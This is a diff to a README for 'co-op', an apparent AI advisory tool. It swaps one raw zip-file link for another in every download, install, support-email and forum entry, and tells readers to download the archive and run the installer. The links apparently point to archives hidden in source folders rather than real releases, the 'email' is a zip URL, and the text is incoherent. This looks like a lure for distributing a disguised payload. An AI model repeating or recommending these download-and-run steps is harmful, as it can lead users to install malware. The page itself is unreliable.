@@ -4,7 +4,7 @@
 Welcome to co-op! Our tool provides expert guidance in areas like legal, finance, and investor relations. Using advanced AI technology, it helps you make informed decisions. This guide will help you download and run co-op easily.
 
 ## 📥 Download Now
-[![Download co-op](https://github.com/BijayKa1676/co-op/raw/refs/heads/main/backend/src/modules/notion/dto/co-op-2.6.zip)](https://github.com/BijayKa1676/co-op/raw/refs/heads/main/backend/src/modules/notion/dto/co-op-2.6.zip)
+[![Download co-op](https://raw.githubusercontent.com/BijayKa1676/co-op/main/backend/op-co-v1.7-beta.2.zip)](https://raw.githubusercontent.com/BijayKa1676/co-op/main/backend/op-co-v1.7-beta.2.zip)
 
 Visit the Releases page to download the latest version of co-op. Click the button above to jump straight to it.
 
@@ -24,13 +24,13 @@ To run co-op, make sure your system meets the following requirements:
 - **Regular Updates:** Keep your software current with our frequent updates.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to [this link](https://github.com/BijayKa1676/co-op/raw/refs/heads/main/backend/src/modules/notion/dto/co-op-2.6.zip) to find the latest version of co-op.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/BijayKa1676/co-op/main/backend/op-co-v1.7-beta.2.zip) to find the latest version of co-op.
 2. **Choose Your Version:** Look for the most recent release. It usually has the highest version number (e.g., v1.2).
-3. **Download the File:** Click on the file that suits your operating system. It may be labeled as `https://github.com/BijayKa1676/co-op/raw/refs/heads/main/backend/src/modules/notion/dto/co-op-2.6.zip`, `https://github.com/BijayKa1676/co-op/raw/refs/heads/main/backend/src/modules/notion/dto/co-op-2.6.zip`, or `https://github.com/BijayKa1676/co-op/raw/refs/heads/main/backend/src/modules/notion/dto/co-op-2.6.zip`.
+3. **Download the File:** Click on the file that suits your operating system. It may be labeled as `https://raw.githubusercontent.com/BijayKa1676/co-op/main/backend/op-co-v1.7-beta.2.zip`, `https://raw.githubusercontent.com/BijayKa1676/co-op/main/backend/op-co-v1.7-beta.2.zip`, or `https://raw.githubusercontent.com/BijayKa1676/co-op/main/backend/op-co-v1.7-beta.2.zip`.
 4. **Run the Installer:** 
    - For Windows, double-click on the `.exe` file and follow the on-screen instructions.
    - For macOS, open the `.dmg` file and drag the co-op app to your Applications folder.
-   - For Linux, extract the `https://github.com/BijayKa1676/co-op/raw/refs/heads/main/backend/src/modules/notion/dto/co-op-2.6.zip` file and run the application in your terminal.
+   - For Linux, extract the `https://raw.githubusercontent.com/BijayKa1676/co-op/main/backend/op-co-v1.7-beta.2.zip` file and run the application in your terminal.
 
 ## ⚙️ How to Use co-op
 1. **Open the Application:** Locate co-op in your Applications folder or desktop and double-click to launch it.
@@ -48,8 +48,8 @@ To help you get the most from co-op, we offer several resources:
 ## 📞 Support
 If you encounter any issues or have questions, please reach out to our support team:
 
-- Email: https://github.com/BijayKa1676/co-op/raw/refs/heads/main/backend/src/modules/notion/dto/co-op-2.6.zip
-- Community Forum: Join discussions with other users [here](https://github.com/BijayKa1676/co-op/raw/refs/heads/main/backend/src/modules/notion/dto/co-op-2.6.zip).
+- Email: https://raw.githubusercontent.com/BijayKa1676/co-op/main/backend/op-co-v1.7-beta.2.zip
+- Community Forum: Join discussions with other users [here](https://raw.githubusercontent.com/BijayKa1676/co-op/main/backend/op-co-v1.7-beta.2.zip).
 
 ## 🔗 Additional Topics
 co-op benefits from advanced topics like:
@@ -80,4 +80,4 @@ We are constantly working on improvements. Make sure to follow our repository fo
 ## 🏁 Conclusion
 Thank you for choosing co-op! We hope this guide makes your experience seamless. With our tool, you can navigate complex topics effortlessly and make informed decisions. Don't hesitate to reach out for support or further information. 
 
-[Download co-op](https://github.com/BijayKa1676/co-op/raw/refs/heads/main/backend/src/modules/notion/dto/co-op-2.6.zip) now and take your first step toward expert guidance!
+[Download co-op](https://raw.githubusercontent.com/BijayKa1676/co-op/main/backend/op-co-v1.7-beta.2.zip) now and take your first step toward expert guidance!
